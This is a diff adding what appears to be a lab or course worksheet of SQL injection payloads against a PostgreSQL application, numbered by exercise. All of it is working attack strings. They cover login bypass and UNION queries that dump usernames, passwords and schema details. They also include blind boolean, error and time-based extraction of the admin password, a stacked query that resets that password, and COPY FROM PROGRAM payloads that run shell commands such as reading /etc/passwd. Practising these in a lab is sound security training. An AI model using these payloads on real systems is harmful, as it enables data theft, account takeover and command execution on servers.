@@ -1,0 +1,70 @@
+*** 2.2.1 - 2.2.2:
+' OR '1'='1'--
+admin' --
+admin' OR '1'='1'--
+
+*** 2.2.3 - 1) UNION attacks:
+' ORDER BY 1--
+' OR '1'='1' UNION SELECT NULL--
+' OR '1'='1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' OR '1'='1' UNION SELECT 'Hello',NULL,NULL,NULL,NULL,NULL,NULL--
+' OR '1'='1' UNION SELECT NULL,'Hello',NULL,NULL,NULL,NULL,NULL--
+' OR '1'='1' UNION SELECT NULL,NULL,'Hello',NULL,NULL,NULL,NULL--
+
+*** 2.2.3 - 2) Leak specific table info: 
+' UNION SELECT NULL,NULL,NULL,NULL FROM messages--
+' UNION SELECT user_id,subject,body,NULL FROM messages--
+' UNION SELECT user_id, subject || ':' || body, NULL, NULL FROM messages--
+' UNION SELECT user_id,subject,body,NULL FROM messages WHERE user_id = 1 --
+' UNION SELECT id, 'USERNAME:' || username, 'PASSWORD:' || password, NULL FROM users--
+- Query schema / table info:
+' UNION SELECT NULL,version(),NULL,NULL--
+' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
+' UNION SELECT NULL, column_name, data_type, NULL FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' --
+' UNION SELECT NULL,current_user,session_user,NULL--
+' UNION SELECT NULL,rolname,'ROLSUPER: ' || rolsuper::text || ', ROLCREATEROLE: ' || rolcreaterole::text, 'ROLCREATEDB: ' || rolcreatedb::text || ', ROLCANLOGIN: ' || rolcanlogin::text FROM pg_roles--
+
+*** 2.2.4 - 1) Boolean-based attacks:
+admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) > 8--
+admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) > 16--
+admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) = 12--
+admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) < 'a
+admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) < 'n
+admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) < 'u
+admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) < 'r
+admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 's
+
+*** 2.2.4 - 2) Error-based attacks:
+' || CAST((SELECT password FROM users WHERE username='admin') AS int) || '
+
+*** 2.2.4 - 3) Time-based attacks:
+' OR EXISTS (SELECT 1 FROM pg_sleep(5))--
+user1' OR (SELECT pg_sleep(5) FROM users WHERE username='admin') IS NULL--
+user1' OR (SELECT pg_sleep(5) FROM users WHERE username LIKE 'user%') IS NULL--
+' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='admin')::text,1,1)='s' THEN pg_sleep(5) ELSE NULL END) IS NULL--
+
+*** 2.3:
+admin'; UPDATE users SET password='newpassword' WHERE username='admin' RETURNING id, username, password;--
+
+*** 2.4:
+';SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;--
+'; COPY users FROM PROGRAM 'id'; --
+'; COPY users FROM PROGRAM 'echo "0, $(id)"'; --
+'; COPY users FROM PROGRAM 'echo 0, $(id)'; --
+
+'; COPY users(username) FROM PROGRAM 'cat /etc/passwd | tr "\n" " "'; --
+'; COPY users(username) FROM PROGRAM 'cat /etc/passwd | tr "\n" " " | cut -c1-50'; --
+'; COPY users(username) FROM PROGRAM 'cat /etc/passwd | tr "\n" " " | cut -c51-100'; --
+
+'; COPY users(username) FROM PROGRAM 'uname -a'; --
+'; COPY users(username) FROM PROGRAM 'uname -a | cut -c1-50'; --
+'; COPY users(username) FROM PROGRAM 'uname -a | cut -c51-100'; --
+'; COPY users(username) FROM PROGRAM 'uname -a | cut -c101-150'; --
+
+
+
+
+
+
+
